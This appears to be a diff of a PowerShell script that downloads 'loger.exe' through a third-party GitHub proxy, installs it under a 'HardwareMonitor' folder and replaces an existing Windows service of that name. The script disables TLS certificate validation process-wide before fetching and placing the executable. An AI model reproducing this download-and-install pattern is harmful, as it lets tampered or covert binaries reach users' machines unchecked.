@@ -1,11 +1,5 @@
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
-try {
-    [Net.ServicePointManager]::SecurityProtocol = 3072 -bor 12288
-} catch {
-    Write-Warning "Could not configure security protocols. Using system defaults."
-}
-
 $DownloadUrl        = "https://gh-proxy.org/https://github.com/Xramas/loger/raw/master/loger.exe"
 $TargetDirectory    = "C:\Program Files\HardwareMonitor"
 $BinaryPath         = Join-Path $TargetDirectory "loger.exe"
@@ -16,15 +10,27 @@ try {
     $ExistingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
     if ($ExistingService) {
         Write-Host "Existing service found. Cleaning up for clean installation..."
+        
+        if (Get-Command Set-ServiceFailure -ErrorAction SilentlyContinue) {
+            & sc.exe failure $ServiceName reset= 0 actions= "" | Out-Null
+        } else {
+            & sc.exe failure $ServiceName reset= 0 actions= "" | Out-Null
+        }
+        Start-Sleep -Seconds 1
+
         if ($ExistingService.Status -eq "Running") {
-            Stop-Service -Name $ServiceName -Force
+            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
             Start-Sleep -Seconds 3
         }
-        $ServiceProcess = Get-CimInstance -ClassName Win32_Service -Filter "Name='$ServiceName'"
+
+        $ServiceProcess = Get-Process -Name "loger" -ErrorAction SilentlyContinue
         if ($ServiceProcess) {
-            $ServiceProcess.Delete() | Out-Null
+            Stop-Process -Name "loger" -Force -ErrorAction SilentlyContinue
             Start-Sleep -Seconds 3
         }
+
+        Remove-Service -Name $ServiceName -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 3
         Write-Host "Existing service removed successfully."
     }
 
@@ -40,13 +46,32 @@ try {
         New-Item -ItemType Directory -Path $TargetDirectory -Force | Out-Null
         Write-Host "Installation directory created: $TargetDirectory"
     }
-
-    Write-Host "Downloading application from server..."
-    Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
-    Write-Host "Download completed: $BinaryPath"
 } catch {
-    Write-Error "Download or directory creation failed: $_"
+    Write-Error "Directory creation failed: $_"
     exit
+}
+
+$DownloadSuccess = $false
+try {
+    Write-Host "Downloading application using Adaptive TLS (1.3 + 1.2)..."
+    [Net.ServicePointManager]::SecurityProtocol = 3072 -bor 12288
+    Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
+    $DownloadSuccess = $true
+} catch {
+    Write-Warning "Adaptive TLS failed. Falling back and locking to TLS 1.2 standard..."
+}
+
+if (-not $DownloadSuccess) {
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = 3072
+        Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
+        Write-Host "Download completed via TLS 1.2 fallback strategy."
+    } catch {
+        Write-Error "Download failed completely even after TLS 1.2 fallback: $_"
+        exit
+    }
+} else {
+    Write-Host "Download completed successfully via adaptive protocols: $BinaryPath"
 }
 
 try {
